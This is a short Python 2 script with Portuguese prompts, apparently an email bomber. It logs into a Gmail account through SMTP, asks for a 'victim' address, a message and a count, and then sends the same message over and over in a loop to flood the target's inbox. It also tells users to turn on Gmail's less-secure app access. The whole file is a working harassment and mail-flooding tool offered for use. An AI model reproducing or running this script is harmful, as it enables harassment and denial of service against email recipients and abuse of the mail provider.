import smtplib as s

print "\n\n Desenvolvido por Lucas Soares"

print "---------------------------------------------------------------"
print "Logue com sua conta do GMAIL para prosseguir. Para utilizar este script e preciso ativar o acesso a aplicativos menos seguros do email que vai enviar(https://goo.gl/sLg7TS).\n"

usuario = raw_input("Login: ")
senha = raw_input("Senha: ")
obj = s.SMTP("smtp.gmail.com:587")
obj.starttls()
obj.login(usuario, senha)

print "---------------------------------------------------------------"
vitima = raw_input("E-mail da vitima: ")
mensagem = raw_input("Mensagem: ")
quantidade = int(raw_input("Quantidade: "))
enviado = 0
emailMensagem = ("---------------------------------------------------------------\n\r %s \n\r---------------------------------------------------------------"
% (mensagem))

print "---------------------------------------------------------------"
while enviado <= quantidade:
        enviado += 1
        obj.sendmail(usuario, vitima, emailMensagem)
        print "Enviando... Aperte Ctrl + C para parar"
print "---------------------------------------------------------------"
print str(enviado) + " email(s) enviados.\n"